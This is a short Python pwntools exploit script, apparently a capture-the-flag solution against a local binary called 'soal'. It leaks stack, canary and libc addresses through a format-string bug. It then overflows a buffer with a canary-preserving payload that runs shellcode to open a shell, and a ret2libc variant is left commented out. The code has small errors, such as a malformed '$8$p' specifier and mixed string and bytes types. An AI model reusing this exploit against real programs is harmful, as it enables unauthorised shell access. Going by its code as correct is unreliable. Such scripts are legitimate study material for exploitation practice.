#!/usr/bin/python

from pwn import *

def exploit(p):
    # leaked stack and canary
    p.sendlineafter(">> ", "||%2$p||%67$p||$8$p")
    leaked_address = p.recvuntil("!")[:-1].split("||")

    # calculate many usefull address like system, etc.
    stack_address = int(leaked_address[1], 16) - 0x64
    canary        = int(leaked_address[2], 16)
    
    # usefull address for ret2libc
    libc_base_address   = int(leaked_address[3], 16) - 0x1fc519
    libc_system         = libc_base_address + 0x244b0
    bin_sh              = libc_base_address + 0x16562f

    # printing leaked address
    info("Stack Address ({})".format(hex(stack_address)))
    info("Canary ({})".format(hex(canary)))

    """
    # writing ret2libc payload
    payload = b''.join([    
        "A"*(0x136),
        p32(canary),
        p32(stack_address+0x136+12),
        p32(libc_system),
        "JUNK",
        p32(bin_sh),
    ])
    """

    # write shellcode in the stack
    payload = b''.join([    
        "A"*(0x136),
        p32(canary),
        p32(stack_address+0x136+12),
        p32(stack_address+0x136+12),
        asm(shellcraft.sh())
    ])

    # sending payload
    p.sendlineafter("\n>> ", payload)
    p.interactive()

if __name__ == "__main__":
    _file = "./soal"
    p = process(_file) 
    exploit(p)
 
